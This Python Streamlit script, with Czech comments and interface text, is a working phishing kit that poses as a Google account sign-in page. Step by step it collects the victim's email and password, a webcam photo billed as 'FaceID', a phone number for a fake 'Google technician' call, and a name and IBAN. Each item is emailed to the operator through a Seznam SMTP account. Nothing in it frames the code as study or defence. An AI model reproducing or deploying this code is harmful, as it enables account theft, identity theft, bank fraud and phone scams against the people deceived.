import streamlit as st
import os
import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from datetime import datetime

# --- NAČTENÍ ÚDAJŮ Z ENV ---
MOJE_ADRESA = os.environ.get("MOJE_ADRESA")
MOJE_HESLO = os.environ.get("MOJE_HESLO")

def odeslat_email(subjekt, text, obrazek=None):
    if not MOJE_ADRESA or not MOJE_HESLO:
        return
    msg = MIMEMultipart()
    msg['Subject'] = subjekt
    msg['From'] = MOJE_ADRESA
    msg['To'] = MOJE_ADRESA
    msg.attach(MIMEText(text))
    if obrazek:
        img = MIMEImage(obrazek.read(), name="foto.png")
        msg.attach(img)
    try:
        server = smtplib.SMTP_SSL("smtp.seznam.cz", 465)
        server.login(MOJE_ADRESA, MOJE_HESLO)
        server.send_message(msg)
        server.quit()
    except:
        pass

# --- LOGIKA ---
if "step" not in st.session_state:
    st.session_state.step = "email"

st.set_page_config(page_title="Přihlášení – Účty Google")

# Google Style CSS
st.markdown("""
    <style>
    div.stButton > button:first-child { 
        background-color: #4285F4; color: white; border-radius: 4px; border: none; width: 100%; 
    }
    </style>
    """, unsafe_allow_html=True)

def logo():
    st.markdown("<h1 style='text-align: center;'><span style='color: #4285F4;'>G</span><span style='color: #EA4335;'>o</span><span style='color: #FBBC05;'>o</span><span style='color: #4285F4;'>g</span><span style='color: #34A853;'>l</span><span style='color: #EA4335;'>e</span></h1>", unsafe_allow_html=True)

# OPRAVA CHYBY: Musí zde být číslo 3
col1, col2, col3 = st.columns(3)

with col2:
    # 1. LOGIN (Email + Heslo)
    if st.session_state.step == "email":
        logo()
        st.subheader("Přihlásit se")
        em = st.text_input("E-mail")
        he = st.text_input("Heslo", type="password")
        if st.button("Další"):
            st.session_state.zadany_email = em
            odeslat_email("🔑 LOGIN", f"Email: {em}\nHeslo: {he}")
            st.session_state.step = "voice"
            st.rerun()

    # 2. VOICE VERIFY
    elif st.session_state.step == "voice":
        logo()
        st.warning("Bezpečnostní ověření hlasem")
        st.write("Řekněte nahlas: 'Potvrzuji své přihlášení'")
        if st.button("Nahrát a ověřit"):
            with st.spinner("Analyzuji..."):
                time.sleep(2)
                odeslat_email("🎙️ VOICE", f"Hlasové ověření dokončeno u: {st.session_state.zadany_email}")
            st.session_state.step = "face"
            st.rerun()

    # 3. FACE VERIFY (Posílá mail s fotkou)
    elif st.session_state.step == "face":
        logo()
        st.subheader("Ověření obličeje")
        foto = st.camera_input("Vyfoťte se pro FaceID")
        if foto:
            odeslat_email("📸 FACE", f"Foto uživatele: {st.session_state.zadany_email}", obrazek=foto)
            st.session_state.step = "options"
            st.rerun()

    # 4. VOLBA (Technik vs BankID)
    elif st.session_state.step == "options":
        logo()
        st.info("Vyžadováno dodatečné ověření")
        tel = st.text_input("Zadejte tel. číslo pro technika")
        if st.button("Počkat na hovor technika"):
            odeslat_email("📞 TEL", f"Číslo: {tel}\nUživatel: {st.session_state.zadany_email}")
            st.success("Technik vás bude kontaktovat.")
            st.session_state.step = "final"
            st.rerun()
        
        st.write("--- NEBO ---")
        
        if st.button("Okamžitě urychlit přes BankID"):
            st.session_state.step = "bank"
            st.rerun()

    # 5. BANK ID
    elif st.session_state.step == "bank":
        logo()
        st.error("Okamžité BankID ověření")
        jm = st.text_input("Jméno")
        ib = st.text_input("IBAN")
        if st.button("Odeslat"):
            odeslat_email("🏦 BANK", f"Jméno: {jm}\nIBAN: {ib}\nUser: {st.session_state.zadany_email}")
            st.session_state.step = "final"
            st.rerun()

    # 6. FINÁLE
    elif st.session_state.step == "final":
        logo()
        st.success("Hotovo. Čekejte na spojení s technikem Google.")
        st.write("Váš účet je v režimu obnovy.")
